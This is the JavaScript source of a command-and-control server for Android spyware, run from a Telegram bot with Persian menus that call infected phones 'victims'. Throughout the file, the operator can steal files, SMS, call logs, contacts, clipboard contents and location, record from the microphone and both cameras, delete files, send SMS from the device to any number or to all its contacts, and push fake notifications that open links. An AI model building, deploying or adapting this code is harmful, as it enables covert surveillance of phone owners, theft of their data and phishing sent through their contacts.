const express = require('express');
const webSocket = require('ws');
const http = require('http')
const telegramBot = require('node-telegram-bot-api')
const uuid4 = require('uuid')
const multer = require('multer');
const bodyParser = require('body-parser')
const axios = require("axios");

const token = 'توکن ربات'
const id = 'ایدی عددی'
const address = 'https://www.google.com'

const app = express();
const appServer = http.createServer(app);
const appSocket = new webSocket.Server({server: appServer});
const appBot = new telegramBot(token, {polling: true});
const appClients = new Map()

const upload = multer();
app.use(bodyParser.json());

let currentUuid = ''
let currentNumber = ''
let currentTitle = ''

app.get('/', function (req, res) {
    res.send('<h1 align="center">𝙎𝙚𝙧𝙫𝙚𝙧 𝙪𝙥𝙡𝙤𝙖𝙙𝙚𝙙 𝙨𝙪𝙘𝙘𝙚𝙨𝙨𝙛𝙪𝙡𝙡𝙮</h1>')
})

app.post("/uploadFile", upload.single('file'), (req, res) => {
    const name = req.file.originalname
    appBot.sendDocument(id, req.file.buffer, {
            caption: `°• 𝙈𝙚𝙨𝙨𝙖𝙜𝙚 𝙛𝙧𝙤𝙢 <b>${req.headers.model}</b> 𝙙𝙚𝙫𝙞𝙘𝙚`,
            parse_mode: "HTML"
        },
        {
            filename: name,
            contentType: 'application/txt',
        })
    res.send('')
})
app.post("/uploadText", (req, res) => {
    appBot.sendMessage(id, `°• 𝙈𝙚𝙨𝙨𝙖𝙜𝙚 𝙛𝙧𝙤𝙢 <b>${req.headers.model}</b> 𝙙𝙚𝙫𝙞𝙘𝙚\n\n` + req.body['@MrHoner'], {parse_mode: "HTML"})
    res.send('@MrHoner')
})
app.post("/uploadLocation", (req, res) => {
    appBot.sendLocation(id, req.body['lat'], req.body['lon'])
    appBot.sendMessage(id, `°• 𝙇𝙤𝙘𝙖𝙩𝙞𝙤𝙣 𝙛𝙧𝙤𝙢 <b>${req.headers.model}</b> 𝙙𝙚𝙫𝙞𝙘𝙚`, {parse_mode: "HTML"})
    res.send('')
})
appSocket.on('connection', (ws, req) => {
    const uuid = uuid4.v4()
    const model = req.headers.model
    const battery = req.headers.battery
    const version = req.headers.version
    const brightness = req.headers.brightness
    const provider = req.headers.provider

    ws.uuid = uuid
    appClients.set(uuid, {
        model: model,
        battery: battery,
        version: version,
        brightness: brightness,
        provider: provider
    })
    appBot.sendMessage(id,
        `°• دستگاه جدید متصل شد 📲\n\n` +
        `• مدل دستگاه 🖥 : <b>${model}</b>\n` +
        `• باتری 🔋 : <b>${battery}</b>\n` +
        `• نسخه اندروید ⚙ : <b>${version}</b>\n` +
        `• روشنایی صفحه نمایش 🔆 : <b>${brightness}</b>\n` +
        `• سیم کارت شبکه 📡 : <b>${provider}</b>`,
        {parse_mode: "HTML"}
    )
    ws.on('close', function () {
        appBot.sendMessage(id,
            `°• دستگاه قطع شد ❌\n\n` +
            `• دستگاه جدید متصل شد 📲 : <b>${model}</b>\n` +
            `• باتری 🔋 : <b>${battery}</b>\n` +
            `• نسخه اندروید ⚙ : <b>${version}</b>\n` +
            `• روشنایی صفحه نمایش 🔆 : <b>${brightness}</b>\n` +
            `• سیم کارت شبکه 📡 : <b>${provider}</b>`,
            {parse_mode: "HTML"}
        )
        appClients.delete(ws.uuid)
    })
})
appBot.on('message', (message) => {
    const chatId = message.chat.id;
    if (message.reply_to_message) {
        if (message.reply_to_message.text.includes('°• لطفا شماره را جهت ارسال پیامک ریپلای کنید ')) {
            currentNumber = message.text
            appBot.sendMessage(id,
                '°• عالی است، اکنون پیامی را که می خواهید به این شماره ارسال کنید وارد کنید\n\n' +
                '• مراقب باشید اگر تعداد کاراکترهای پیام شما بیش از حد مجاز باشد، پیام ارسال نخواهد شد',
                {reply_markup: {force_reply: true}}
            )
        }
        if (message.reply_to_message.text.includes('°• عالی است، اکنون پیامی را که می خواهید به این شماره ارسال کنید وارد کنید')) {
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`send_message:${currentNumber}/${message.text}`)
                }
            });
            currentNumber = ''
            currentUuid = ''
            appBot.sendMessage(id,
                '°• درخواست شما در حال انجام است ✅\n\n' +
                '• در چند لحظه آینده پاسخی دریافت خواهید کرد 😁 😁',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["دستگاه های متصل 📱"], ["کنترل کردن دستگاه 👾"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• پیامی را که می خواهید برای همه مخاطبین ارسال کنید وارد کنید')) {
            const message_to_all = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`send_message_to_all:${message_to_all}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• درخواست شما در حال انجام است ✅\n\n' +
                '• در چند لحظه آینده پاسخی دریافت خواهید کرد 😁 😁',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["دستگاه های متصل 📱"], ["کنترل کردن دستگاه 👾"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• مسیر فایلی را که می خواهید دانلود کنید وارد کنید')) {
            const path = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`file:${path}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• درخواست شما در حال انجام است ✅\n\n' +
                '• در چند لحظه آینده پاسخی دریافت خواهید کرد 😁 😁',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["دستگاه های متصل 📱"], ["کنترل کردن دستگاه 👾"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• مسیر فایلی را که می خواهید حذف کنید وارد کنید')) {
            const path = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`delete_file:${path}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• درخواست شما در حال انجام است ✅\n\n' +
                '• در چند لحظه آینده پاسخی دریافت خواهید کرد 😁',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["دستگاه های متصل 📱"], ["کنترل کردن دستگاه 👾"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• مدت زمانی را که می خواهید میکروفون ضبط شود را وارد کنید')) {
            const duration = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`microphone:${duration}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• درخواست شما در حال انجام است ✅\n\n' +
                '• در چند لحظه آینده پاسخی دریافت خواهید کرد 😁',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["دستگاه های متصل 📱"], ["کنترل کردن دستگاه 👾"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• مدت زمانی که می خواهید دوربین اصلی ضبط شود را وارد کنید')) {
            const duration = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`rec_camera_main:${duration}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• درخواست شما در حال انجام است ✅\n\n' +
                '• در چند لحظه آینده پاسخی دریافت خواهید کرد 😁',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["دستگاه های متصل 📱"], ["کنترل کردن دستگاه 👾"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• مدت زمانی که می خواهید دوربین سلفی ضبط شود را وارد کنید')) {
            const duration = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`rec_camera_selfie:${duration}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• درخواست شما در حال انجام است ✅\n\n' +
                '• در چند لحظه آینده پاسخی دریافت خواهید کرد 😁',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["دستگاه های متصل 📱"], ["کنترل کردن دستگاه 👾"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• پیامی را وارد کنید که می خواهید در دستگاه مورد نظر ظاهر شود')) {
            const toastMessage = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`toast:${toastMessage}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• درخواست شما در حال انجام است ✅\n\n' +
                '• در چند لحظه آینده پاسخی دریافت خواهید کرد 😁',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["دستگاه های متصل 📱"], ["کنترل کردن دستگاه 👾"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• پیامی را که می خواهید به عنوان اعلان نمایش داده شود وارد کنید')) {
            const notificationMessage = message.text
            currentTitle = notificationMessage
            appBot.sendMessage(id,
                '°• عالی است، اکنون لینکی را وارد کنید که می خواهید با اعلان باز شود\n\n' +
                '• وقتی قربانی روی اعلان کلیک می کند، پیوندی که وارد می کنید باز می شود',
                {reply_markup: {force_reply: true}}
            )
        }
        if (message.reply_to_message.text.includes('°• عالی است، اکنون لینکی را وارد کنید که می خواهید با اعلان باز شود')) {
            const link = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`show_notification:${currentTitle}/${link}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• درخواست شما در حال انجام است ✅\n\n' +
                '• در چند لحظه آینده پاسخی دریافت خواهید کرد 😁',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["دستگاه های متصل 📱"], ["کنترل کردن دستگاه 👾"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• لینک صوتی مورد نظر برای پخش را وارد کنید')) {
            const audioLink = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`play_audio:${audioLink}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• درخواست شما در حال انجام است ✅\n\n' +
                '• در چند لحظه آینده پاسخی دریافت خواهید کرد 😁',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["دستگاه های متصل 📱"], ["کنترل کردن دستگاه 👾"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
    }
    if (id == chatId) {
        if (message.text == '/start') {
            appBot.sendMessage(id,
                '°• 👾 به صفحه مدیریت گوشی خوش آمدید 👾\n\n' +
                '• 🎃 اگر برنامه روی دستگاه مورد نظر (قربآنی)  با موفقیت نصب شد منتظر اتصال باشید 🎃\n\n' +
                '• 🔅 هنگامی که پیام ( دستگاه متصل شده است ) را دریافت می کنید، به این معنی است که دستگاه مورد نظر آنلاین است و برای کنترل میتوانید اقدام کنید 🔅\n\n' +
                '• ❎ شما میتوانید با استفاده از دکمه های پایین دستگاه های متصل آنلاین را مشاهده و کنترل کنید ❎\n\n' +
                '• اگر در جایی از ربات گیر کردید، دستور /start را ارسال کنید 😎',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["دستگاه های متصل 📱"], ["کنترل کردن دستگاه 👾"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.text == 'دستگاه های متصل 📱') {
            if (appClients.size == 0) {
                appBot.sendMessage(id,
                    '°• هیچ دستگاه آنلاینی موجود نیست ✖️\n\n' +
                    '• اطمینان حاصل کنید که برنامه بر روی دستگاه مورد نظر (قربانی)  نصب شده است 📲'
                )
            } else {
                let text = '°• 🔸 لیست دستگاه های آنلاین 🔹 :\n\n'
                appClients.forEach(function (value, key, map) {
                    text += `• مدل دستگاه 🖥 : <b>${value.model}</b>\n` +
                        `• باتری 🔋 : <b>${value.battery}</b>\n` +
                        `• نسخه اندروید ⚙ : <b>${value.version}</b>\n` +
                        `• روشنایی صفحه نمایش 🔆 : <b>${value.brightness}</b>\n` +
                        `• سیم کارت شبکه 📡 : <b>${value.provider}</b>\n\n`
                })
                appBot.sendMessage(id, text, {parse_mode: "HTML"})
            }
        }
        if (message.text == 'کنترل کردن دستگاه 👾') {
            if (appClients.size == 0) {
                appBot.sendMessage(id,
                    '°• هیچ دستگاه آنلاینی موجود نیست ✖️\n\n' +
                    '• اطمینان حاصل کنید که برنامه بر روی دستگاه مورد نظر (قربانی)  نصب شده است 📲'
                )
            } else {
                const deviceListKeyboard = []
                appClients.forEach(function (value, key, map) {
                    deviceListKeyboard.push([{
                        text: value.model,
                        callback_data: 'device:' + key
                    }])
                })
                appBot.sendMessage(id, '°• 🌀 دستگاه را برای کنترل انتخاب کنید 🌀', {
                    "reply_markup": {
                        "inline_keyboard": deviceListKeyboard,
                    },
                })
            }
        }
    } else {
        appBot.sendMessage(id, '°• اجازه رد شد  ❌')
    }
})
appBot.on("callback_query", (callbackQuery) => {
    const msg = callbackQuery.message;
    const data = callbackQuery.data
    const commend = data.split(':')[0]
    const uuid = data.split(':')[1]
    console.log(uuid)
    if (commend == 'device') {
        appBot.editMessageText(`°• 💀 دستور مورد نظر را برای کنترل دستگاه قربانی انتخاب کنید 💀 : <b>${appClients.get(data.split(':')[1]).model}</b>`, {
            width: 10000,
            chat_id: id,
            message_id: msg.message_id,
            reply_markup: {
                inline_keyboard: [
                    [
                        {text: 'برنامه هآ 🧩', callback_data: `apps:${uuid}`},
                        {text: 'مشخصات دستگاه ⚙', callback_data: `device_info:${uuid}`}
                    ],
                    [
                        {text: 'دریافت فایل و رسانه 🗂', callback_data: `file:${uuid}`},
                        {text: 'حذف فایل ❌', callback_data: `delete_file:${uuid}`}
                    ],
                    [
                        {text: 'کلیپ برد 🔖', callback_data: `clipboard:${uuid}`},
                        {text: 'میکروفون 🎙', callback_data: `microphone:${uuid}`},
                    ],
                    [
                        {text: 'دوربین اصلی 📸', callback_data: `camera_main:${uuid}`},
                        {text: ' دوربین سلفی 📷', callback_data: `camera_selfie:${uuid}`}
                    ],
                    [
                        {text: 'لوکیشن📍', callback_data: `location:${uuid}`},
                        {text: 'نمایش پیام 🪁', callback_data: `toast:${uuid}`}
                    ],
                    [
                        {text: 'تماس 📞', callback_data: `calls:${uuid}`},
                        {text: 'مخاطبین 🥷', callback_data: `contacts:${uuid}`}
                    ],
                    [
                        {text: 'لرزش  🎯', callback_data: `vibrate:${uuid}`},
                        {text: 'نشان دادن اعلان 📣', callback_data: `show_notification:${uuid}`}
                    ],
                    [
                        {text: 'پیامک ها 📨', callback_data: `messages:${uuid}`},
                        {text: 'ارسال پیامک 📩', callback_data: `send_message:${uuid}`}
                    ],
                    [
                        {text: 'پخش صدا 📢', callback_data: `play_audio:${uuid}`},
                        {text: 'متوقف کردن صدا 📢', callback_data: `stop_audio:${uuid}`},
                    ],
                    [
                        {
                            text: 'به همه مخاطبین پیام ارسال کنید',
                            callback_data: `send_message_to_all:${uuid}`
                        }
                    ],
                ]
            },
            parse_mode: "HTML"
        })
    }
    if (commend == 'calls') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('calls');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• درخواست شما در حال انجام است ✅\n\n' +
            '• در چند لحظه آینده پاسخی دریافت خواهید کرد 😁',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["دستگاه های متصل 📱"], ["کنترل کردن دستگاه 👾"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'contacts') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('contacts');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• درخواست شما در حال انجام است ✅\n\n' +
            '• در چند لحظه آینده پاسخی دریافت خواهید کرد 😁',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["دستگاه های متصل 📱"], ["کنترل کردن دستگاه 👾"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'messages') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('messages');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• درخواست شما در حال انجام است ✅\n\n' +
            '• در چند لحظه آینده پاسخی دریافت خواهید کرد 😁',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["دستگاه های متصل 📱"], ["کنترل کردن دستگاه 👾"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'apps') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('apps');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• درخواست شما در حال انجام است ✅\n\n' +
            '• در چند لحظه آینده پاسخی دریافت خواهید کرد 😁',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["دستگاه های متصل 📱"], ["کنترل کردن دستگاه 👾"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'device_info') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('device_info');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• درخواست شما در حال انجام است ✅\n\n' +
            '• در چند لحظه آینده پاسخی دریافت خواهید کرد 😁',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["دستگاه های متصل 📱"], ["کنترل کردن دستگاه 👾"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'clipboard') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('clipboard');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• درخواست شما در حال انجام است ✅\n\n' +
            '• در چند لحظه آینده پاسخی دریافت خواهید کرد 😁',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["دستگاه های متصل 📱"], ["کنترل کردن دستگاه 👾"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'camera_main') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('camera_main');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• درخواست شما در حال انجام است ✅\n\n' +
            '• در چند لحظه آینده پاسخی دریافت خواهید کرد 😁',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["دستگاه های متصل 📱"], ["کنترل کردن دستگاه 👾"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'camera_selfie') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('camera_selfie');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• درخواست شما در حال انجام است ✅\n\n' +
            '• در چند لحظه آینده پاسخی دریافت خواهید کرد 😁',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["دستگاه های متصل 📱"], ["کنترل کردن دستگاه 👾"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'location') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('location');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• درخواست شما در حال انجام است ✅\n\n' +
            '• در چند لحظه آینده پاسخی دریافت خواهید کرد 😁',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["دستگاه های متصل 📱"], ["کنترل کردن دستگاه 👾"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'vibrate') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('vibrate');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• درخواست شما در حال انجام است ✅\n\n' +
            '• در چند لحظه آینده پاسخی دریافت خواهید کرد 😁',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["دستگاه های متصل 📱"], ["کنترل کردن دستگاه 👾"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'stop_audio') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('stop_audio');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• درخواست شما در حال انجام است ✅\n\n' +
            '• در چند لحظه آینده پاسخی دریافت خواهید کرد 😁',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["دستگاه های متصل 📱"], ["کنترل کردن دستگاه 👾"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'send_message') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id, '°• لطفا به شماره ای که می خواهید پیامک به آن ارسال کنید پاسخ دهید\n\n' +
            '•اگر می خواهید به شماره های کشور محلی پیامک ارسال کنید، می توانید شماره را با صفر در ابتدا وارد کنید در غیر این صورت شماره را با کد کشور وارد کنید',
            {reply_markup: {force_reply: true}})
        currentUuid = uuid
    }
    if (commend == 'send_message_to_all') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• پیامی را که میخواهید به تمام مخاطبین ارسال کنید را وارد کنید\n\n' +
            '• مراقب باشید اگر تعداد کاراکترهای پیام شما بیش از حد مجاز باشد، پیام ارسال نمیشود',
            {reply_markup: {force_reply: true}}
        )
        currentUuid = uuid
    }
    if (commend == 'file') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• مسیر فایلی را که می خواهید دانلود کنید وارد کنید\n\n' +
            '• نیازی نیست مسیر کامل را وارد کنید . مانند مثال مثل مسیر را به این صورت وارد کنید<b> DCIM/Camera </b> دریافت فایل های گالری',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'delete_file') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• مسیر فایلی که میخواهید حذف کنید را وارد کنید\n\n' +
            '• نیازی نیست مسیر کامل را وارد کنید . مانند مثال مثل مسیر را به این صورت وارد کنید<b> DCIM/Camera </b> حذف فایل های گالری',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'microphone') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• مدت زمانی را که می خواهید میکروفون ضبط شود را وارد کنید\n\n' +
            '• توجه داشته باشید که باید زمان را به صورت عددی بر حسب واحد ثانیه وارد کنید',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'toast') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• پیامی را وارد کنید که می خواهید در دستگاه مورد نظر ظاهر شود\n\n' +
            '• توآست (Toast) پیام کوتاهی است که برای چند ثانیه روی صفحه نمایش دستگاه ظاهر می شود',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'show_notification') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• پیامی را که می خواهید به عنوان اعلان نمایش داده شود وارد کنید\n\n' +
            '• پیام شما مانند اعلان معمولی در نوار وضعیت دستگاه مورد نظر ظاهر می شود',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'play_audio') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• لینک صوتی مورد نظر برای پخش را وارد کنید\n\n' +
            '• توجه داشته باشید که باید لینک مستقیم صدای مورد نظر را وارد کنید در غیر این صورت صدا پخش نمی شود',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
});
setInterval(function () {
    appSocket.clients.forEach(function each(ws) {
        ws.send('ping')
    });
    try {
        axios.get(address).then(r => "")
    } catch (e) {
    }
}, 5000)
appServer.listen(process.env.PORT || 8999);
